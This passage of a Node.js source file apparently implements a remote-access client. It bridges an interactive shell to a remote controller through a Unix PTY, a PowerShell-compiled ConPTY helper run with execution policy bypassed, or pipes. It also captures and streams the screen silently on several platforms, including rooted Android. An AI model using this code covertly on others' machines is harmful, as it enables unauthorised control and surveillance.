              Buffer.from('\r\n[client] shell input dropped: the shell is not reading\r\n', 'utf8'));
          }
        }
      }
    })().catch(() => {});
  } else {
    // Pipe fallback: local echo, line editing, submit complete lines.
    const decoder = new TextDecoder('utf-8');
    let pendingEscape = '';
    let line = [];
    let lastWasCr = false;
    (async () => {
      for (;;) {
        if (finished || SHELL_CANCEL) return;
        const piece = await conn.queue.readSome(65536, { deadline: now() + 0.2 });
        if (piece === null) {
          if (conn.queue.closed || finished) return;
          continue;
        }
        if (!piece.length) continue;
        const decoded = pendingEscape + decoder.decode(piece, { stream: true });
        const filtered = filterShellKeys(decoded);
        pendingEscape = filtered.unfinished;
        for (const char of filtered.text) {
          if (char === '\n' && lastWasCr) { lastWasCr = false; continue; }
          lastWasCr = char === '\r';
          if (char === '\r' || char === '\n') {
            const command = line.join('');
            line = [];
            enqueueOutput(Buffer.from('\r\n', 'utf8'));
            if (!child.stdin.destroyed) {
              try { child.stdin.write(command + '\r\n'); } catch { /* ignore */ }
            }
            continue;
          }
          if (char === '\x7f' || char === '\b') {
            if (line.length) {
              line.pop();
              enqueueOutput(Buffer.from('\b \b', 'utf8'));
            }
            continue;
          }
          if (char === '\x03') {
            line = [];
            enqueueOutput(Buffer.from('^C\r\n', 'utf8'));
            // 0x03 written to a pipe is not an interrupt, but some hosts
            // still honour it; there is no portable console-event path here.
            if (!child.stdin.destroyed) {
              try { child.stdin.write(Buffer.from([0x03])); } catch { /* ignore */ }
            }
            continue;
          }
          if (char === '\t') {
            line.push('    ');
            enqueueOutput(Buffer.from('    ', 'utf8'));
            continue;
          }
          if (char < ' ') continue;
          line.push(char);
          enqueueOutput(Buffer.from(char, 'utf8'));
        }
      }
    })().catch(() => {});
  }

  await finishedPromise;
  // Deliver the tail before the channel closes.
  try { await Promise.race([outputChain, sleep(750)]); } catch { /* ignore */ }
  for (const stream of [child.stdout, child.stderr, child.stdin]) {
    if (stream) { try { stream.destroy(); } catch { /* ignore */ } }
  }
  if (!childGone(child)) {
    try { await killProcess(child); } catch { /* ignore */ }
  }
}

function filterShellKeys(text) {
  const out = [];
  let index = 0;
  const length = text.length;
  while (index < length) {
    const char = text[index];
    if (char !== '\x1b') {
      out.push(char);
      index += 1;
      continue;
    }
    let nextIndex = index + 1;
    if (nextIndex >= length) return { text: out.join(''), unfinished: text.slice(index) };
    if (text[nextIndex] === '[' || text[nextIndex] === 'O') {
      nextIndex += 1;
      while (nextIndex < length && !(text[nextIndex] >= '@' && text[nextIndex] <= '~')) nextIndex += 1;
      if (nextIndex >= length) return { text: out.join(''), unfinished: text.slice(index) };
      index = nextIndex + 1;
      continue;
    }
    index += 2;
  }
  return { text: out.join(''), unfinished: '' };
}

async function shellUnix(conn, rows, cols) {
  const inner = 'stty rows ' + rows + ' cols ' + cols + ' 2>/dev/null; exec '
    + shSingleQuote(shellPath()) + ' -i';
  const scriptBin = which('script');
  if (scriptBin) {
    let child = null;
    const args = IS_DARWIN
      ? ['-q', '/dev/null', '/bin/sh', '-c', inner]
      : ['-qfec', inner, '/dev/null'];
    try {
      child = require('child_process').spawn(scriptBin, args, {
        stdio: ['pipe', 'pipe', 'pipe'], env: shellChildEnv(), windowsHide: true,
      });
    } catch {
      child = null;
    }
    if (child) {
      const spawned = await new Promise((resolve) => {
        let settled = false;
        child.once('spawn', () => { if (!settled) { settled = true; resolve(true); } });
        child.once('error', () => { if (!settled) { settled = true; resolve(false); } });
        setTimeout(() => { if (!settled) { settled = true; resolve(true); } }, 500).unref?.();
      });
      if (spawned) {
        // A very fast failure (e.g. an old busybox script without -e) falls
        // back to the pipe shell instead of leaving a dead channel.
        const earlyExit = await Promise.race([
          new Promise((resolve) => child.once('exit', () => resolve(true))),
          sleep(250).then(() => false),
        ]);
        if (!earlyExit) {
          await bridgeShell(conn, child, 'pty', rows, cols);
          return;
        }
      }
      try { child.kill('SIGKILL'); } catch { /* ignore */ }
    }
  }
  await sendShellOutput(conn,
    Buffer.from('\r\n[client] no usable script(1) PTY here; running a line-oriented shell\r\n', 'utf8'));
  await shellPipeMode(conn, rows, cols);
}

// --- Windows: a real ConPTY through a tiny PowerShell bridge --------------
// Node has no native console API, so a PowerShell helper compiled at runtime
// with Add-Type creates the pseudoconsole and pumps raw bytes between this
// client and it.  Ctrl+C travels through the pty input as 0x03, exactly like
// the C# client's ConPTY path.  If the helper cannot start (old Windows,
// constrained PowerShell), the line-oriented pipe shell below still works.
const CONPTY_PS1 = [
  'param([int]$Cols, [int]$Rows, [string]$Command)',
  '$ErrorActionPreference = "Stop"',
  "$src = @'",
  'using System;',
  'using System.IO;',
  'using System.Runtime.InteropServices;',
  'using System.Text;',
  'using System.Threading;',
  'using Microsoft.Win32.SafeHandles;',
  '',
  'public static class CmonConPty {',
  '    [StructLayout(LayoutKind.Sequential)] public struct COORD { public short X; public short Y; }',
  '    [StructLayout(LayoutKind.Sequential)] public struct SECURITY_ATTRIBUTES { public int nLength; public IntPtr lpSecurityDescriptor; public int bInheritHandle; }',
  '    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO {',
  '        public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle;',
  '        public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars;',
  '        public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow;',
  '        public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;',
  '    }',
  '    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFOEX { public STARTUPINFO StartupInfo; public IntPtr lpAttributeList; }',
  '    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }',
  '',
  '    [DllImport("kernel32.dll", SetLastError = true)] static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);',
  '    [DllImport("kernel32.dll", SetLastError = true)] static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);',
  '    [DllImport("kernel32.dll", SetLastError = true)] static extern void ClosePseudoConsole(IntPtr hPC);',
  '    [DllImport("kernel32.dll", SetLastError = true)] static extern bool CloseHandle(IntPtr hObject);',
  '    [DllImport("kernel32.dll", SetLastError = true)] static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);',
  '    [DllImport("kernel32.dll", SetLastError = true)] static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);',
  '    [DllImport("kernel32.dll", SetLastError = true)] static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);',
  '    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] static extern bool CreateProcess(string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);',
  '    [DllImport("kernel32.dll", SetLastError = true)] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);',
  '',
  '    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;',
  '    static readonly IntPtr PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = (IntPtr)0x00020016;',
  '',
  '    public static int Run(string command, int cols, int rows) {',
  '        IntPtr inRead = IntPtr.Zero, inWrite = IntPtr.Zero, outRead = IntPtr.Zero, outWrite = IntPtr.Zero;',
  '        IntPtr hPC = IntPtr.Zero, attrList = IntPtr.Zero;',
  '        IntPtr attrSize = IntPtr.Zero;',
  '        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();',
  '        sa.nLength = Marshal.SizeOf(sa);',
  '        sa.bInheritHandle = 1;',
  '        if (!CreatePipe(out inRead, out inWrite, ref sa, 0)) return 10;',
  '        if (!CreatePipe(out outRead, out outWrite, ref sa, 0)) return 11;',
  '        COORD size = new COORD();',
  '        size.X = (short)cols; size.Y = (short)rows;',
  '        if (CreatePseudoConsole(size, inRead, outWrite, 0, out hPC) != 0) return 12;',
  '        CloseHandle(inRead); CloseHandle(outWrite);   // the pty keeps its own copies',
  '        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrSize);',
  '        attrList = Marshal.AllocHGlobal(attrSize);',
  '        if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrSize)) return 13;',
  '        if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, hPC, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero)) return 14;',
  '        STARTUPINFOEX si = new STARTUPINFOEX();',
  '        si.StartupInfo.cb = Marshal.SizeOf(si);',
  '        si.lpAttributeList = attrList;',
  '        PROCESS_INFORMATION pi;',
  '        StringBuilder sb = new StringBuilder(command);',
  '        if (!CreateProcess(null, sb, IntPtr.Zero, IntPtr.Zero, false,',
  '                EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, out pi)) return 15;',
  '        DeleteProcThreadAttributeList(attrList);',
  '        Marshal.FreeHGlobal(attrList);',
  '        CloseHandle(pi.hThread);',
  '        FileStream stdin = new FileStream(new SafeFileHandle(inWrite, true), FileAccess.Write);',
  '        FileStream stdout = new FileStream(new SafeFileHandle(outRead, true), FileAccess.Read);',
  '        Stream consoleOut = Console.OpenStandardOutput();',
  '        Stream consoleIn = Console.OpenStandardInput();',
  '        Thread reader = new Thread(delegate() {',
  '            byte[] buf = new byte[65536];',
  '            try {',
  '                int n;',
  '                while ((n = stdout.Read(buf, 0, buf.Length)) > 0) {',
  '                    consoleOut.Write(buf, 0, n);',
  '                    consoleOut.Flush();',
  '                }',
  '            } catch (Exception) { }',
  '        });',
  '        reader.IsBackground = true;',
  '        reader.Start();',
  '        byte[] inbuf = new byte[65536];',
  '        try {',
  '            int n;',
  '            while ((n = consoleIn.Read(inbuf, 0, inbuf.Length)) > 0) {',
  '                stdin.Write(inbuf, 0, n);',
  '                stdin.Flush();',
  '                if (WaitForSingleObject(pi.hProcess, 0) == 0) break;',
  '            }',
  '        } catch (Exception) { }',
  '        WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);',
  '        ClosePseudoConsole(hPC);',
  '        reader.Join(1000);',
  '        return 0;',
  '    }',
  '}',
  "'@",
  'Add-Type -TypeDefinition $src -Language CSharp | Out-Null',
  'exit [CmonConPty]::Run($Command, $Cols, $Rows)',
  '',
].join('\n');

function waitChildSpawn(child, ms) {
  return new Promise((resolve) => {
    let settled = false;
    const done = (value) => { if (!settled) { settled = true; resolve(value); } };
    child.once('spawn', () => done(true));
    child.once('error', () => done(false));
    child.once('exit', () => done(false));       // exited before the timeout
    const timer = setTimeout(() => done(true), ms);
    if (timer.unref) timer.unref();
  });
}

async function shellWindowsConpty(conn, rows, cols) {
  const dir = mktempDir('cmon-conpty-');
  const scriptPath = path.join(dir, 'conpty.ps1');
  try {
    fs.writeFileSync(scriptPath, CONPTY_PS1, 'utf8');
    const ps = powershellPath();
    const shellExe = which('powershell.exe') || which('powershell')
      || which('pwsh.exe') || which('pwsh') || 'powershell.exe';
    const command = shSingleQuoteWin(shellExe) + ' -NoLogo -NoProfile';
    let child;
    try {
      child = require('child_process').spawn(ps,
        ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass',
          '-File', scriptPath, String(cols), String(rows), command],
        { stdio: ['pipe', 'pipe', 'ignore'], windowsHide: true, env: shellChildEnv() });
    } catch {
      return false;
    }
    if (!(await waitChildSpawn(child, 1500))) {
      try { await killProcess(child); } catch { /* ignore */ }
      return false;
    }
    // A failed CreatePseudoConsole/CreateProcess makes the helper exit right
    // away; give it a moment so the pipe shell can take over instead of the
    // controller seeing a channel that dies at once.
    await sleep(400);
    if (childGone(child)) return false;
    await bridgeShell(conn, child, 'pty', rows, cols);
    return true;
  } catch (e) {
    log('[!] ConPTY helper failed: ' + errorText(e));
    return false;
  } finally {
    try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
  }
}

function shSingleQuoteWin(value) {
  return '"' + String(value).replace(/"/g, '\\"') + '"';
}

async function shellWindows(conn, rows, cols) {
  if (await shellWindowsConpty(conn, rows, cols)) return;
  await sendShellOutput(conn, Buffer.from(
    '\r\n[client] ConPTY is unavailable here; running a line-oriented shell\r\n', 'utf8'));
  await shellPipeMode(conn, rows, cols);
}

async function shellPipeMode(conn, rows, cols) {
  let shell;
  if (IS_WINDOWS) {
    shell = which('powershell.exe') || which('powershell') || which('pwsh') || 'cmd.exe';
  } else {
    shell = shellPath();
  }
  let child;
  try {
    child = require('child_process').spawn(shell, [], {
      stdio: ['pipe', 'pipe', 'pipe'], env: shellChildEnv(), windowsHide: true,
    });
  } catch (e) {
    throw new Error('cannot start ' + shell + ': ' + errorText(e));
  }
  const spawned = await new Promise((resolve) => {
    let settled = false;
    child.once('spawn', () => { if (!settled) { settled = true; resolve(true); } });
    child.once('error', () => { if (!settled) { settled = true; resolve(false); } });
  });
  if (!spawned) throw new Error('cannot start ' + shell);
  await bridgeShell(conn, child, 'pipe', rows, cols);
}

// ---------------------------------------------------------------------------
// Screenshots and screen sharing (mirrors grab_screen / stream_screen)
//
// Node has no image or capture library, so every backend is an external tool
// that already ships with the OS or is common on it.  Each tool is asked for
// a format it emits efficiently (JPEG for stills, and PPM/BMP for streaming);
// the built-in codecs decode or consume those directly:
//   Windows : PowerShell + .NET (always present) - equivalent of Pillow's
//             ImageGrab with all_screens
//   macOS   : the built-in screencapture command (-C paints the pointer)
//   Android : root screencap (stock Android blocks it; reported clearly)
//   iOS     : only a jailbreak has a capture tool; reported clearly
//   Wayland : grim / spectacle / the XDG portal (GNOME refuses the direct
//             GNOME-Shell API since 41, so the portal is a real fallback)
//   X11     : ImageMagick import, scrot or maim - all silent, no window
// ---------------------------------------------------------------------------
const CAPTURE_STATE = { hasCursor: false };
const X11_CAPTURE_TOOLS = new Set(['magick', 'scrot', 'maim']);
const ANDROID_ROOT_CACHE = { granted: false, deniedAt: null };

function suPath() {
  const found = which('su');
  if (found) return found;
  for (const candidate of ['/system/bin/su', '/system/xbin/su', '/sbin/su',
    '/debug_ramdisk/su']) {
    if (anyExists(candidate)) return candidate;
  }
  return null;
}

// True when su is granted.  A success is cached forever; a failure is
// remembered briefly so a denied Magisk prompt is not asked again on every
// frame, while a later grant still works (mirrors _android_root).
async function androidRoot() {
  if (ANDROID_ROOT_CACHE.granted) return true;
  const deniedAt = ANDROID_ROOT_CACHE.deniedAt;
  if (deniedAt !== null && now() - deniedAt < 45) return false;
  const su = suPath();
  if (!su) return false;
  let ok = false;
  try {
    const out = await runCapture([su, '-c', 'id -u'], 10000);
    ok = out.toString('utf8').trim() === '0';
  } catch { ok = false; }
  if (ok) ANDROID_ROOT_CACHE.granted = true;
  else ANDROID_ROOT_CACHE.deniedAt = now();
  return ok;
}

function mktempDir(prefix = 'client_shot_') {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

// Run one helper, capturing stdout/stderr with hard size and time bounds.
function runCapture(argv, timeoutMs = 15000) {
  return new Promise((resolve, reject) => {
    let child;
    try {
      child = spawnChild(argv[0], argv.slice(1),
        { stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true });
    } catch (e) {
      reject(e);
      return;
    }
    const chunks = [];
    let size = 0;
    let stderr = Buffer.alloc(0);
    let done = false;
    const finish = (fn, value) => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      fn(value);
    };
    const timer = setTimeout(() => {
      try { child.kill('SIGKILL'); } catch { /* ignore */ }
      finish(reject, new Error('capture helper timed out'));
    }, timeoutMs);
    if (timer.unref) timer.unref();
    child.stdout.on('data', (data) => {
      size += data.length;
      if (size > MAX_CAPTURE_BYTES) {
        try { child.kill('SIGKILL'); } catch { /* ignore */ }
        finish(reject, new Error('capture output is too large'));
        return;
      }
      chunks.push(data);
    });
    child.stderr.on('data', (data) => {
      if (stderr.length < 4096) stderr = Buffer.concat([stderr, data]);
    });
    child.on('error', (e) => finish(reject, e));
    child.on('close', (code) => {
      if (code === 0) {
        finish(resolve, Buffer.concat(chunks));
        return;
      }
      const detail = stderr.toString('utf8').trim().split('\n').filter(Boolean).pop();
      finish(reject, new Error(detail || 'exit status ' + code));
    });
  });
}

async function captureStdout(argv) {
  const data = await runCapture(argv);
  if (!data.length) throw new Error('capture produced no output');
  return data;
}

async function captureFile(argv) {
  const dir = mktempDir();
  const file = path.join(dir, 'shot.png');
  try {
    await runCapture([...argv, file]);
    let info;
    try { info = fs.lstatSync(file); }
    catch { throw new Error('capture produced no file'); }
    if (!info.isFile()) throw new Error('capture did not produce a regular file');
    if (info.size <= 0) throw new Error('capture produced an empty file');
    if (info.size > MAX_CAPTURE_BYTES) throw new Error('capture file is too large');
    return fs.readFileSync(file);
  } finally {
    try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
  }
}

function decodeCapture(data) {
  try {
    return decodeImage(data);
  } catch (e) {
    throw new Error('capture produced an unreadable image (' + errorText(e) + ')');
  }
}

// --- Windows: PowerShell + .NET (the ImageGrab equivalent) -----------------
// Screenshots are saved as JPEG quality 90: the .NET JPEG encoder is much
// faster than its PNG encoder.  Streaming asks for BMP instead, which skips
// the full-resolution JPEG decode on high-DPI 4K displays.
function psCaptureScript(bmp) {
  const parts = [
    'Add-Type -AssemblyName System.Windows.Forms',
    'Add-Type -AssemblyName System.Drawing',
    '$b = [System.Windows.Forms.SystemInformation]::VirtualScreen',
    '$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height',
    '$g = [System.Drawing.Graphics]::FromImage($bmp)',
    '$g.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size)',
    '$g.Dispose()',
  ];
  if (bmp) {
    parts.push('$bmp.Save($env:CMON_SHOT_PATH, [System.Drawing.Imaging.ImageFormat]::Bmp)');
  } else {
    parts.push(
      '$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }',
      '$ep = New-Object System.Drawing.Imaging.EncoderParameters 1',
      '$ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [int]90)',
      '$bmp.Save($env:CMON_SHOT_PATH, $codec, $ep)');
  }
  parts.push('$bmp.Dispose()');
  return parts.join('; ');
}
const PS_CAPTURE_SCRIPT = psCaptureScript(false);
const PS_CAPTURE_BMP_SCRIPT = psCaptureScript(true);

function powershellPath() {
  return which('powershell.exe') || which('powershell')
    || which('pwsh.exe') || which('pwsh') || 'powershell.exe';
}

async function captureWindowsOnce(bmp) {
  const dir = mktempDir();
  const file = path.join(dir, bmp ? 'shot.bmp' : 'shot.jpg');
  try {
    const env = { ...process.env, CMON_SHOT_PATH: file };
    await runCaptureEnv([powershellPath(), '-NoProfile', '-NonInteractive',
      '-ExecutionPolicy', 'Bypass', '-Command',
      bmp ? PS_CAPTURE_BMP_SCRIPT : PS_CAPTURE_SCRIPT], env);
    let info;
    try { info = fs.lstatSync(file); }
    catch { throw new Error('PowerShell reported success but wrote no screenshot'); }
    if (!info.isFile()) throw new Error('capture did not produce a regular file');
    if (info.size <= 0) throw new Error('capture produced an empty file');
    if (info.size > MAX_CAPTURE_BYTES) throw new Error('capture file is too large');
    const data = fs.readFileSync(file);
    return bmp ? decodeBmp(data) : decodeCapture(data);
  } finally {
    try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
  }
}

async function captureWindows(fast = false) {
  if (fast) {
    try { return await captureWindowsOnce(true); }
    catch { /* fall back to JPEG below */ }
  }
  return captureWindowsOnce(false);
}

function runCaptureEnv(argv, env, timeoutMs = 20000) {
  return new Promise((resolve, reject) => {
    let child;
    try {
      child = spawnChild(argv[0], argv.slice(1),
        { stdio: ['ignore', 'pipe', 'pipe'], env, windowsHide: true });
    } catch (e) { reject(e); return; }
    let stderr = Buffer.alloc(0);
    let done = false;
    const finish = (fn, value) => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      fn(value);
    };
    const timer = setTimeout(() => {
      try { child.kill('SIGKILL'); } catch { /* ignore */ }
      finish(reject, new Error('capture helper timed out'));
    }, timeoutMs);
    if (timer.unref) timer.unref();
    child.stdout.on('data', () => { /* drained: the picture is the file */ });
    child.stderr.on('data', (data) => {
      if (stderr.length < 4096) stderr = Buffer.concat([stderr, data]);
    });
    child.on('error', (e) => finish(reject, e));
    child.on('close', (code) => {
      if (code === 0) { finish(resolve, null); return; }
      const detail = stderr.toString('utf8').trim().split('\n').filter(Boolean).pop();
      finish(reject, new Error(detail || 'exit status ' + code));
    });
  });
}

// --- macOS (and a jailbroken iOS): built-in screencapture ------------------
// -x silent, -C paints the pointer (so no overlay), -m main display,
// -t png so the built-in codec can convert it.
async function captureScreencaptureWith(type, bmp) {
  const dir = mktempDir();
  const file = path.join(dir, 'shot.' + type);
  const exe = which('screencapture') || '/usr/sbin/screencapture';
  try {
    // -x silent, -C paints the pointer, -m main display, -t jpg skips a PNG
    // pass (same flags as the Python/C# clients).
    await runCapture([exe, '-x', '-C', '-m', '-t', type, file]);
    let info;
    try { info = fs.lstatSync(file); }
    catch { throw new Error('screencapture wrote no file'); }
    if (!info.isFile()) throw new Error('capture did not produce a regular file');
    if (info.size <= 0 || info.size > MAX_CAPTURE_BYTES) {
      throw new Error('capture produced an invalid file size');
    }
    const data = fs.readFileSync(file);
    return bmp ? decodeBmp(data) : decodeCapture(data);
  } finally {
    try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
  }
}

async function captureScreencapture(fast = false) {
  // Streaming asks for uncompressed BMP: decoding a Retina-sized JPEG in JS
  // is the slowest part of a macOS screen share, while BMP rows are already
  // in a layout fitRgb() can consume.  If BMP is unavailable, use JPEG.
  if (fast) {
    try { return await captureScreencaptureWith('bmp', true); }
    catch { /* fall back to JPEG below */ }
  }
  return captureScreencaptureWith('jpg', false);
}

// --- Android: root screencap ------------------------------------------------
async function captureAndroid() {
  if (!(await androidRoot())) {
    throw new Error('Android blocks screen capture without root '
      + '(grant su in Magisk/KernelSU, then retry)');
  }
  const su = suPath() || 'su';
  const exe = anyExists('/system/bin/screencap') ? '/system/bin/screencap' : 'screencap';
  // Termux's LD_LIBRARY_PATH breaks the system binary's linker.
  const data = await captureStdout([su, '-c', 'unset LD_LIBRARY_PATH; ' + exe + ' -p']);
  return decodeCapture(data);
}

// --- GNOME Shell (pre-41) direct API ----------------------------------------
async function captureGnomeShell() {
  const exe = which('gdbus');
  if (!exe) throw new Error('gdbus is not installed (glib2 package)');
  const dir = mktempDir();
  const file = path.join(dir, 'shot.png');
  try {
    const out = (await runCapture([exe, 'call', '--session', '--dest',
      'org.gnome.Shell.Screenshot', '--object-path',
      '/org/gnome/Shell/Screenshot', '--method',
      'org.gnome.Shell.Screenshot.Screenshot', 'true', 'false', file], 15000))
      .toString('utf8').trim();
    if (!out.startsWith('(true')) {
      throw new Error('refused: ' + (out.slice(0, 160) || 'no reply'));
    }
    let info;
    try { info = fs.lstatSync(file); }
    catch { throw new Error('GNOME Shell reported success but wrote no screenshot file'); }
    if (!info.isFile()) throw new Error('capture did not produce a regular file');
    if (info.size <= 0 || info.size > MAX_CAPTURE_BYTES) {
      throw new Error('capture produced an invalid file size');
    }
    return decodeCapture(fs.readFileSync(file));
  } finally {
    try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
  }
}

// --- XDG desktop portal (GNOME Wayland and a generic fallback) --------------
// Same design as client.py: a tiny persistent Python/PyGObject helper that
// answers one 'shot' line with 'OK <file-uri>' or 'ERR <reason>'.  Kept alive
// between stream frames because starting an interpreter per frame is slow;
// it exits on EOF so it cannot outlive a killed client.
const PORTAL_HELPER_SCRIPT = `
import os
import sys

try:
    from gi.repository import Gio, GLib
except Exception as exc:
    sys.stderr.write('PyGObject (gi) is not available: %s' % exc)
    raise SystemExit(3)

try:
    bus = Gio.bus_get_sync(Gio.BusType.SESSION, None)
except Exception as exc:
    sys.stderr.write('cannot open the session bus: %s' % exc)
    raise SystemExit(3)

unique = (bus.get_unique_name() or '').lstrip(':').replace('.', '_')
state = {'expected': '', 'done': True, 'ok': False, 'error': '', 'uri': '',
         'loop': None, 'timer': 0}


def finish(ok, text='', uri=''):
    if state['done']:
        return
    state['done'] = True
    state['ok'] = ok
    state['error'] = text
    state['uri'] = uri
    if state['loop'] is not None:
        state['loop'].quit()


def on_response(conn, sender, path, iface, signal_name, params):
    if path != state['expected'] or state['done']:
        return
    try:
        response, results = params.unpack()
    except Exception as exc:
        finish(False, 'bad portal response: %s' % exc)
        return
    if response != 0:
        finish(False, 'screenshot request refused (portal response %s)' % response)
        return
    uri = results.get('uri') if isinstance(results, dict) else None
    if hasattr(uri, 'unpack'):
        uri = uri.unpack()
    if not uri:
        finish(False, 'the portal returned no screenshot file')
        return
    finish(True, uri=str(uri))


def on_timeout():
    finish(False, 'the desktop portal did not answer within 25s')
    return False


bus.signal_subscribe('org.freedesktop.portal.Desktop',
                     'org.freedesktop.portal.Request', 'Response',
                     None, None, Gio.DBusSignalFlags.NONE, on_response)

counter = 0
for line in sys.stdin:
    if line.strip().lower() != 'shot':
        continue
    counter += 1
    token = 'cmonshot%d_%d' % (os.getpid(), counter)
    state.update(expected='/org/freedesktop/portal/desktop/request/%s/%s'
                 % (unique, token), done=False, ok=False, error='', uri='')
    state['loop'] = GLib.MainLoop()
    state['timer'] = GLib.timeout_add_seconds(25, on_timeout)
    options = {'handle_token': GLib.Variant('s', token),
               'interactive': GLib.Variant('b', False)}
    try:
        bus.call_sync('org.freedesktop.portal.Desktop',
                      '/org/freedesktop/portal/desktop',
                      'org.freedesktop.portal.Screenshot', 'Screenshot',
                      GLib.Variant('(sa{sv})', ('', options)),
                      GLib.VariantType('(o)'), Gio.DBusCallFlags.NONE,
                      10000, None)
    except Exception as exc:
        finish(False, 'portal call failed: %s' % exc)
    if not state['done']:
        state['loop'].run()
    if state['timer']:
        try:
            GLib.source_remove(state['timer'])
        except Exception:
            pass
        state['timer'] = 0
    if state['ok']:
        sys.stdout.write('OK %s\\n' % state['uri'])
    else:
        sys.stdout.write('ERR %s\\n' % (state['error'] or
                                       'portal screenshot failed'))
    sys.stdout.flush()
raise SystemExit(0)
`;

const GI_PYTHON = { probed: false, path: null };

async function pythonWithGi() {
  if (GI_PYTHON.probed) return GI_PYTHON.path;
  const candidates = [];
  for (const candidate of [process.env.CMON_PYTHON, '/usr/bin/python3', which('python3')]) {
    if (candidate && !candidates.includes(candidate)) candidates.push(candidate);
  }
  for (const exe of candidates) {
    try {
      await runCapture([exe, '-c', 'import gi'], 20000);
      GI_PYTHON.probed = true;
      GI_PYTHON.path = exe;
      return exe;
    } catch { /* try the next interpreter */ }
  }
  GI_PYTHON.probed = true;
  GI_PYTHON.path = null;
  return null;
}

const PORTAL_HELPER = { child: null, pending: null, lines: [], waiters: [], failedUntil: 0 };

function stopPortalHelper() {
  const child = PORTAL_HELPER.child;
  PORTAL_HELPER.child = null;
  PORTAL_HELPER.waiters = [];
  if (!child) return;
  try { child.stdin.end(); } catch { /* ignore */ }
  const killer = setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* ignore */ } }, 1000);
  if (killer.unref) killer.unref();
}

async function startPortalHelper() {
  const python = await pythonWithGi();
  if (!python) throw new Error('PyGObject (gi) is not available in any python3');
  const child = spawnChild(python, ['-c', PORTAL_HELPER_SCRIPT],
    { stdio: ['pipe', 'pipe', 'pipe'], windowsHide: true });
  PORTAL_HELPER.child = child;
  PORTAL_HELPER.lines = [];
  PORTAL_HELPER.waiters = [];
  let buffer = '';
  child.stdout.on('data', (data) => {
    buffer += data.toString('utf8');
    let index;
    while ((index = buffer.indexOf('\n')) >= 0) {
      const line = buffer.slice(0, index).trim();
      buffer = buffer.slice(index + 1);
      const waiter = PORTAL_HELPER.waiters.shift();
      if (waiter) waiter(line);
      else PORTAL_HELPER.lines.push(line);
    }
  });
  child.on('error', () => { if (PORTAL_HELPER.child === child) PORTAL_HELPER.child = null; });
  child.on('close', () => {
    if (PORTAL_HELPER.child === child) PORTAL_HELPER.child = null;
    for (const waiter of PORTAL_HELPER.waiters.splice(0)) waiter('');
  });
  return child;
}

function portalNextLine(timeoutMs) {
  if (PORTAL_HELPER.lines.length) return Promise.resolve(PORTAL_HELPER.lines.shift());
  return new Promise((resolve) => {
    let settled = false;
    const waiter = (line) => { if (!settled) { settled = true; clearTimeout(timer); resolve(line); } };
    const timer = setTimeout(() => {
      if (settled) return;
      settled = true;
      const index = PORTAL_HELPER.waiters.indexOf(waiter);
      if (index >= 0) PORTAL_HELPER.waiters.splice(index, 1);
      resolve('');
    }, timeoutMs);
    if (timer.unref) timer.unref();
    PORTAL_HELPER.waiters.push(waiter);
  });
}

let PORTAL_CHAIN = Promise.resolve();

function portalShot() {
  const run = PORTAL_CHAIN.then(async () => {
    if (now() < PORTAL_HELPER.failedUntil) {
      throw new Error('the desktop portal recently failed; not retrying yet');
    }
    let child = PORTAL_HELPER.child;
    if (!child || child.exitCode !== null) {
      try {
        child = await startPortalHelper();
      } catch (e) {
        PORTAL_HELPER.failedUntil = now() + 30;
        throw e;
      }
    }
    try {
      child.stdin.write('shot\n');
    } catch (e) {
      stopPortalHelper();
      throw new Error('the portal helper stopped: ' + errorText(e));
    }
    const line = await portalNextLine(30000);
